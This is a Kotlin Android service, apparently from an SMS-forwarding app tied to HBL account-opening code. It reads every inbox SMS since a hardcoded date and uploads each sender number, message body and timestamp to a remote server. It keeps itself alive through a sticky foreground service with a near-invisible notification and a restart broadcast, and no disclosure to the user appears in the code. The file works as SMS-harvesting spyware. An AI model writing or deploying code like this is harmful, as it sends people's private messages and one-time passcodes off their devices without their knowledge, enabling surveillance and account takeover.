package com.paxees.sms

import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.IntentFilter
import android.database.Cursor
import android.graphics.Color
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.util.Log
import android.widget.Toast
import androidx.annotation.RequiresApi
import androidx.core.app.NotificationCompat
import com.google.gson.Gson
import com.hbl.hblaccountopeningapp.network.ResponseHandlers.callbacks.SmsCallBack
import com.hbl.hblaccountopeningapp.network.enums.RetrofitEnums
import com.hbl.hblaccountopeningapp.network.models.response.base.BaseResponse
import com.hbl.hblaccountopeningapp.network.models.response.base.SmsRequest
import com.paxees.sms.network.ApiStore
import com.paxees.sms.network.GlobalClass
import com.paxees.sms.network.SmsResponse
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody
import java.text.SimpleDateFormat
import java.util.*

class YourService : Service() {
    var counter = 0
    override fun onCreate() {
        super.onCreate()
        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.O) startMyOwnForeground() else startForeground(
            0,
            Notification()
        )
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private fun startMyOwnForeground() {
        val NOTIFICATION_CHANNEL_ID = "example.permanence"
        val channelName = "Background Service"
        val chan = NotificationChannel(
            NOTIFICATION_CHANNEL_ID,
            channelName,
            NotificationManager.IMPORTANCE_NONE
        )
        chan.lightColor = Color.BLUE
        chan.lockscreenVisibility = Notification.VISIBILITY_PRIVATE
        val manager = (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
        manager.createNotificationChannel(chan)
        val notificationBuilder = NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
        val notification = notificationBuilder.setOngoing(true)
            .setContentTitle("App is running in background")
            .setPriority(NotificationManager.IMPORTANCE_MIN)
            .setCategory(Notification.CATEGORY_SERVICE)
            .build()
        startForeground(2, notification)
    }
    fun startBroadCast(){
//        val filter = IntentFilter()
//        filter.addAction("restartService")
//        filter.priority = 2147483647
//        val receiver = Restarter()
//        registerReceiver(receiver, filter)

        val broadcastIntent = Intent()
        broadcastIntent.action = "restartservice"
        broadcastIntent.setClass(this, Restarter::class.java)
        this.sendBroadcast(broadcastIntent)
    }
    override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        Log.i("BackServices", "Back Service Started")
        startBroadCast()
        sendSms()
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
//        stoptimertask()
    }


    private var timer: Timer? = null
    private var timerTask: TimerTask? = null
    private var count = 0;
    fun sendSms(){
        var list = getSMS()!!
        count = getSMS()!!.size;
        Log.i("BackServices", "Inbox Sms Count is " + count)
        if (count != 0) {
            postSms(
                list.getOrNull(list.size - count)!!.msg!!,
                list.getOrNull(list.size - count)!!.number!!,
                list.getOrNull(list.size - count)!!.dateTime!!
            )
        }
    }
    fun startTimer() {
        timer = Timer()
        timerTask = object : TimerTask() {
            override fun run() {
                Log.i("BackServices", "=========  " + counter++)
            }
        }
        timer!!.scheduleAtFixedRate(timerTask, 0,300*1000) //
    }

    fun stoptimertask() {
        if (timer != null) {
            timer!!.cancel()
            timer = null
        }
    }

    fun postSms(msg: String, number: String, dateTime: String) {
        var request = SmsRequest()
        request.datetime = dateTime
        request.securecode = GlobalClass.sourceCode
        request.phone = number
        request.sms = msg
        val dateTimeValue: RequestBody = RequestBody.create(
            "text/plain".toMediaTypeOrNull(),
            dateTime
        )
        val secureCodeValue: RequestBody = RequestBody.create(
            "text/plain".toMediaTypeOrNull(),
            GlobalClass.sourceCode
        )
        val numberValue: RequestBody = RequestBody.create(
            "text/plain".toMediaTypeOrNull(),
            number
        )
        val sms: RequestBody = RequestBody.create(
            "text/plain".toMediaTypeOrNull(),
            msg
        )

        Log.i("BackServices", "Request" + Gson().toJson(request))
        ApiStore.instance?.postSms(
            RetrofitEnums.URL_HBL,
            secureCodeValue,numberValue,sms,dateTimeValue,
            object : SmsCallBack {
                override fun SmsSuccess(response: SmsResponse) {
                    var list = getSMS()!!
                    if (count == 1) {
                        Toast.makeText(this@YourService,"All inbox message from todays date",Toast.LENGTH_LONG).show()
                        Log.i("BackServices", "All Sms Sent" + Gson().toJson(response))
                    } else {
                        Log.i("BackServices", Gson().toJson(response))
                        count--;
                        postSms(
                            list.getOrNull(list.size - count)!!.msg!!,
                            list.getOrNull(list.size - count)!!.number!!,
                            list.getOrNull(list.size-count)!!.dateTime!!
                        )
                    }
                }

                override fun SmsFailure(response: BaseResponse) {
                    Log.i("BackServices", Gson().toJson(response))
                }
            })
    }


    @SuppressLint("Range")
    fun getSMS():ArrayList<SmsModel> {
        val sms: ArrayList<SmsModel> = ArrayList()
        val uriSMSURI: Uri = Uri.parse("content://sms/inbox")
        val givenDateString = "00:00:00 25-01-2023"
        val sdf = SimpleDateFormat("HH:mm:ss dd-MM-yyyy")
        val mDate: Date = sdf.parse(givenDateString)
        val timeInMilliseconds = mDate.time
        val cur: Cursor? = contentResolver.query(uriSMSURI,
            arrayOf("address", "date", "body"), "date>=${timeInMilliseconds.toString()}",
            null, null)

        while (cur!!.moveToNext()) {
            var smsModel = SmsModel();
            val address: String = cur.getString(cur.getColumnIndex("address"))
            val body: String = cur.getString(cur.getColumnIndexOrThrow("body"))
            val date: String = cur.getString(cur.getColumnIndexOrThrow("date"))
            smsModel.number = address
            smsModel.msg = body
            smsModel.dateTime = millisToDate(date.toLong())!!
            smsModel.id = date!!
            sms.add(smsModel!!)
            Log.i("datafilter","${millisToDate(date.toLong())!!} - $body - $address")
        }
        return sms
    }



    fun millisToDate(currentTime: Long): String? {
        val calendar = Calendar.getInstance()
        calendar.timeInMillis = currentTime
        val sdf = SimpleDateFormat("hh:mm:ss a dd-MM-yyyy")
        var dateData = sdf.format(calendar.time).toString()
        return dateData
    }

    override fun onBind(intent: Intent): IBinder? {
        return null
    }
}